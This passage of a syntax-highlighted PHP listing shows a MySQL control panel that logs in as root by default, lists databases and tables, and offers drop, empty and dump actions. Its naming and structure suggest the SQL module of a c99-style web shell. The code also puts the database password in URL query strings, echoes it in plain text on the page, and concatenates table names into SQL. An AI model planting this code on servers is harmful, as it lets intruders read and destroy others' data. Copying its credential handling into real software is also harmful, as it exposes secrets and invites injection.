<span class="lineno"> 531</span>     <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Query&quot;</span><span class="p">,</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_act=query&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">));</span>
<span class="lineno"> 532</span>     <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Server-status&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=serverstatus&quot;</span><span class="p">);</span>
<span class="lineno"> 533</span>     <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Server variables&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=servervars&quot;</span><span class="p">);</span>
<span class="lineno"> 534</span>     <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Processes&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=processes&quot;</span><span class="p">);</span>
<span class="lineno"> 535</span>     <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Logout&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&quot;</span><span class="p">);</span>
<span class="lineno"> 536</span>     <span class="k">echo</span> <span class="s2">&quot;MySQL &quot;</span><span class="o">.</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; (proto v.&quot;</span><span class="o">.</span><span class="nb">mysql_get_proto_info</span> <span class="p">()</span><span class="o">.</span><span class="s2">&quot;) Server: &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; as &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;@&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (password - </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 537</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$sqlquicklaunch</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 538</span>       <span class="k">foreach</span><span class="p">(</span><span class="nv">$sqlquicklaunch</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 539</span>         <span class="k">echo</span> <span class="s2">&quot;[ &lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt; ] &quot;</span><span class="p">;</span>
<span class="lineno"> 540</span>       <span class="p">}</span>
<span class="lineno"> 541</span>       <span class="p">}</span>
<span class="lineno"> 542</span>   <span class="p">}</span>
<span class="lineno"> 543</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 544</span> 
<span class="lineno"> 545</span> 
<span class="lineno"> 546</span> <span class="x">&lt;/div&gt;</span>
<span class="lineno"> 547</span> <span class="x">&lt;table&gt;</span>
<span class="lineno"> 548</span> <span class="x">    &lt;tr&gt;</span>
<span class="lineno"> 549</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 550</span>   <span class="c1">#Login Form</span>
<span class="lineno"> 551</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 552</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 553</span> 
<span class="lineno"> 554</span> 
<span class="lineno"> 555</span> <span class="x">    &lt;td&gt;</span>
<span class="lineno"> 556</span> <span class="x">    &lt;form name=&quot;f_sql&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno"> 557</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&gt;</span>
<span class="lineno"> 558</span> <span class="x">        &lt;table class=&quot;explorer&quot;&gt;</span>
<span class="lineno"> 559</span> <span class="x">            &lt;tr&gt;</span>
<span class="lineno"> 560</span> <span class="x">            &lt;th&gt;Username&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;sql_login&quot; value=&quot;root&quot;&gt;&lt;/th&gt;</span>
<span class="lineno"> 561</span> <span class="x">            &lt;th&gt;Password&lt;br&gt;&lt;input type=&quot;password&quot; name=&quot;sql_passwd&quot; value=&quot;&quot;&gt;&lt;/th&gt;</span>
<span class="lineno"> 562</span> <span class="x">            &lt;th&gt;Database&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;sql_db&quot; value=&quot;&quot;&gt;&lt;/th&gt;</span>
<span class="lineno"> 563</span> <span class="x">            &lt;th&gt;Host&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;sql_server&quot; value=&quot;localhost&quot;&gt;&lt;/th&gt;</span>
<span class="lineno"> 564</span> <span class="x">            &lt;th&gt;Port&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;sql_port&quot; value=&quot;3306&quot; size=&quot;3&quot;&gt;&lt;/th&gt;</span>
<span class="lineno"> 565</span> <span class="x">            &lt;/tr&gt;</span>
<span class="lineno"> 566</span> <span class="x">            &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Connect&quot;&gt;&lt;/th&gt;&lt;/tr&gt;</span>
<span class="lineno"> 567</span> <span class="x">        &lt;/table&gt;</span>
<span class="lineno"> 568</span> <span class="x">    &lt;/form&gt;</span>
<span class="lineno"> 569</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 570</span>   <span class="p">}</span>
<span class="lineno"> 571</span>   <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 572</span>     <span class="c1">#Start left panel</span>
<span class="lineno"> 573</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 574</span> 
<span class="lineno"> 575</span> 
<span class="lineno"> 576</span> <span class="x">    &lt;td&gt;</span>
<span class="lineno"> 577</span> <span class="x">    &lt;center&gt;</span>
<span class="lineno"> 578</span> <span class="x">    &lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;b&gt;HOME&lt;/b&gt;&lt;/a&gt;</span>
<span class="lineno"> 579</span> <span class="x">    &lt;hr size=&quot;1&quot; noshade&gt;</span>
<span class="lineno"> 580</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 581</span>       <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_list_dbs</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
<span class="lineno"> 582</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno"> 583</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 584</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 585</span> 
<span class="lineno"> 586</span> 
<span class="lineno"> 587</span> <span class="x">    Database</span>
<span class="lineno"> 588</span> <span class="x">    &lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 589</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&gt;</span>
<span class="lineno"> 590</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 591</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 592</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 593</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 594</span> <span class="x">        &lt;select name=&quot;sql_db&quot; onchange=&quot;this.form.submit()&quot;&gt;</span>
<span class="lineno"> 595</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 596</span>         <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 597</span>         <span class="nv">$dbs</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 598</span>         <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 599</span>           <span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 600</span>           <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_db</span> <span class="o">==</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span> <span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot; selected&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 601</span>           <span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot;&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/option&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 602</span>           <span class="nv">$c</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 603</span>         <span class="p">}</span>
<span class="lineno"> 604</span>         <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&gt;Databases (&quot;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&quot;)&lt;/option&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 605</span>         <span class="k">echo</span> <span class="nv">$dbs</span><span class="p">;</span>
<span class="lineno"> 606</span>       <span class="p">}</span>
<span class="lineno"> 607</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 608</span> 
<span class="lineno"> 609</span> 
<span class="lineno"> 610</span> <span class="x">        &lt;/select&gt;</span>
<span class="lineno"> 611</span> <span class="x">    &lt;/form&gt;</span>
<span class="lineno"> 612</span> <span class="x">    &lt;/center&gt;</span>
<span class="lineno"> 613</span> <span class="x">    &lt;hr size=&quot;1&quot; noshade&gt;</span>
<span class="lineno"> 614</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 615</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 616</span>       <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_list_tables</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span>
<span class="lineno"> 617</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 618</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 619</span>         <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">-=[ &lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;&amp;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/a&gt; ]=-&lt;br&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 620</span>         <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 621</span>         <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 622</span>           <span class="nv">$count</span> <span class="o">=</span> <span class="nb">mysql_query</span> <span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM &quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno"> 623</span>           <span class="nv">$count_row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
<span class="lineno"> 624</span>           <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;b&gt;+ &lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_db=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt;&lt;/b&gt; (&quot;</span><span class="o">.</span><span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)&lt;/br&gt;&lt;/b&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 625</span>           <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
<span class="lineno"> 626</span>           <span class="nv">$c</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 627</span>         <span class="p">}</span>
<span class="lineno"> 628</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;No tables found in database&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 629</span>       <span class="p">}</span>
<span class="lineno"> 630</span>     <span class="p">}</span>
<span class="lineno"> 631</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 632</span> <span class="x">    &lt;/td&gt;</span>
<span class="lineno"> 633</span> <span class="x">    &lt;td&gt;</span>
<span class="lineno"> 634</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 635</span>     <span class="c1">#Start center panel</span>
<span class="lineno"> 636</span>     <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno"> 637</span>     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_db</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 638</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$c</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 639</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$c</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$c</span> <span class="o">=</span> <span class="s2">&quot;no&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 640</span>       <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;center&gt;&lt;b&gt;There are &quot;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&quot; table(s) in database: &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 641</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="o">@</span><span class="nv">$dbquicklaunch</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 642</span>         <span class="k">foreach</span><span class="p">(</span><span class="nv">$dbsqlquicklaunch</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 643</span>           <span class="k">echo</span> <span class="s2">&quot;[ &lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt; ] &quot;</span><span class="p">;</span>
<span class="lineno"> 644</span>         <span class="p">}</span>
<span class="lineno"> 645</span>       <span class="p">}</span>
<span class="lineno"> 646</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;/b&gt;&lt;/center&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 647</span>       <span class="nv">$acts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;dump&quot;</span><span class="p">);</span>
<span class="lineno"> 648</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbldrop&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;DROP TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
<span class="lineno"> 649</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblempty&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
<span class="lineno"> 650</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbldump&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$boxtbl</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dmptbls</span> <span class="o">=</span> <span class="nv">$boxtbl</span><span class="p">;}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$thistbl</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dmptbls</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">);}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;dump&quot;</span><span class="p">;}</span>
<span class="lineno"> 651</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblcheck&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;CHECK TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
<span class="lineno"> 652</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbloptimize&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;OPTIMIZE TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
<span class="lineno"> 653</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblrepair&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;REPAIR TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
